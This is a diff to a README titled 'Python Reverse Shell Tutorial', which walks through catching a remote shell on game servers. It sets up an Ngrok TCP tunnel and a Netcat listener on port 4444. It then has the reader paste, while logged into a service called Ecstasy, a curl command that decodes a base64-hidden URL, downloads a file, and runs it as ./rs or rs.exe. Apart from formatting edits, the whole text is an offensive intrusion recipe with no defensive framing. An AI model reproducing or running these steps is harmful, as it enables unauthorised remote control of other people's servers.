@@ -1,4 +1,5 @@
-# Simplest Reverse Shell Tutorial (Supports Some Linux and Some Windows Servers)
+# Python Reverse Shell Tutorial (Linux and Windows Servers)
+you will need [Python](https://www.python.org/downloads/), [Netcat](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip), & [Ngrok](https://ngrok.com)
 
 ## On Your Own Computer
 1. **Get Netcat**  
@@ -9,11 +10,11 @@
    - [Download and setup Ngrok](https://ngrok.com)
 
 3. **Start Ngrok**  
-```ngrok tcp 4444```
+`ngrok tcp 4444`
 
 
 4. **Start Netcat**  
-```nc -lvp 4444```
+`nc -lvp 4444`
 
 
 5. **Download and Edit Python File**
@@ -27,7 +28,7 @@
 ## In Game (run under the shell command)
 7. **Copy and Paste the Command into Ecstasy**
    - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
-`curl -O $(echo "`{BASE64 GOES HERE}`" | base64 --decode)`
+`curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)`
 
 
 8. **Encode Filename and Extension to Base64**
@@ -35,9 +36,9 @@
 
 9. **Run the File**
 Linux:
- ```./rs```
+ `./rs`
 Windows:
-```start rs.exe```
+`start rs.exe`
  - If there are errors, idk..
 
 
